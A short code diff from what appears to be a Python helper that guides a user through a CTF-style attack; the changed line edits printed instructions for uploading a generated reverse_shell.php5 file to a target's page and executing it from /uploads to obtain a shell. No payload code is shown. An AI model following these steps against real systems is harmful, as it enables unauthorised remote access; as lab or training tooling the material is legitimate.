@@ -187,7 +187,7 @@ class Function():
         except FileNotFoundError:
             print(f'Fail to create a file on path:/home/{getpass.getuser()}/Desktop/')
         print(f"\nGo to /home/{getpass.getuser()}/Desktop, you would find reverse_shell.php5.")
-        print(f"Upload it to the {Data['IP']}/panel page.")
+        print(f"Upload it to the {Data['IP']}/"+"{"+"existing page you found"+"}."+f" ex: {Data['IP']}/panel")
         print(f"Go to the {Data['IP']}/uploads page, click the file to execute (Make sure you listening to the port first).\n")
         result = input("After you get shell, press enter to move on next step.\n")
         match = check_output_data(Data, block_Out)
